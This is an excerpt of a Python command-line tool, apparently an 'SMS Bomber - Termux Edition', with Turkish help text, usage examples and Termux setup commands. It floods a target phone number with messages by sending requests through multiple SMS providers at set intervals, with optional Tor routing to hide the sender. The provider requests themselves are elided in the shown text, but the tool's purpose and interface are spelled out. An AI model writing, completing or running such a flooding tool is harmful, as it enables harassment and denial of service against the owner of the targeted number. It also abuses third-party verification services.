...
try:
    ...
    print("\033[91m[!] requests paketi yok! pip install requests\033[0m")
    sys.exit(1)
...
HELP_MESSAGE = f"""
{YELLOW}═══════════════════════════════════════════════════════════════════════{RESET}
{WHITE}📖 SMS BOMBER - KULLANIM KILAVUZU{RESET}
{YELLOW}═══════════════════════════════════════════════════════════════════════{RESET}

{CYAN}KULLANIM:{RESET}
  python sms_bomber_termux.py {GREEN}-n NUMARA -d SURE -i ARALIK{RESET}

{YELLOW}PARAMETRELER:{RESET}
  {GREEN}-n, --number{RESET}     Telefon numarası (10 haneli, 90'sız)
  {GREEN}-d, --duration{RESET}   Çalışma süresi (saniye) - Varsayılan: {CYAN}60{RESET}
  {GREEN}-i, --interval{RESET}  SMS aralığı (saniye) - Varsayılan: {CYAN}2.0{RESET}
  {GREEN}-t, --tor{RESET}       Tor proxy kullan - Varsayılan: {RED}Kapalı{RESET}
  {GREEN}-q, --quiet{RESET}     Sessiz mod - Varsayılan: {RED}Kapalı{RESET}
  {GREEN}-h, --help{RESET}      Yardım mesajı

{YELLOW}TERMUX KURULUM:{RESET}
  {GREEN}pkg update && pkg upgrade -y{RESET}
  {GREEN}pkg install python -y{RESET}
  {GREEN}pip install requests{RESET}
  {GREEN}pip install colorama{RESET}

{YELLOW}ÖRNEK KULLANIM:{RESET}
  {CYAN}python sms_bomber_termux.py -n 5551234567 -d 120 -i 3{RESET}
  {CYAN}python sms_bomber_termux.py -n 5551234567 -d 60 -i 1 -t{RESET}
...
class SMSProvider:
    ...
    def send(self, phone):
        try:
            ...
            return {'success': False, 'provider': self.name, 'error': str(e)[:40]}
...
class SMSBomber:
    ...
    def run(self):
        ...
        if not self.quiet:
            ...
            print(f"{WHITE}📱 Hedef: {self.phone}{RESET}")
            print(f"{WHITE}⏱ Süre: {self.duration}s | Aralık: {self.interval}s{RESET}")
            print(f"{WHITE}📡 Provider: {len(self.providers)}{RESET}\n")
...
def main():
    parser = argparse.ArgumentParser(description='SMS Bomber - Termux Edition', add_help=False)
    ...
    parser.add_argument('-h', '--help', action='store_true', help='Yardım mesajı')
    ...
    phone = args.number
    if not phone:
        print(f"{YELLOW}[?] Telefon numarası (10 haneli, 90'sız): {RESET}", end='')
        phone = input().strip()
    
    phone = ''.join(filter(str.isdigit, phone))
    if len(phone) < 10:
        print(f"{RED}[!] Geçersiz numara! En az 10 haneli olmalı.{RESET}")
        sys.exit(1)
    phone = phone[-10:]
    
    print(f"{MAGENTA}📱 Numara: {phone}{RESET}")
    print(f"{MAGENTA}⏱ Süre: {args.duration}s | Aralık: {args.interval}s{RESET}")
    print(f"{MAGENTA}🔐 Tor: {'AKTIF' if args.tor else 'PASIF'}{RESET}")
    print()
    
    bomber = SMSBomber(phone, args.duration, args.interval, args.tor, args.quiet)
    provider_count = bomber.load_providers()
    print(f"{GREEN}[+] {provider_count} provider yüklendi.{RESET}")
    
    if not args.quiet:
        print(f"{YELLOW}[?] Başlatsın mı? (e/h): {RESET}", end='')
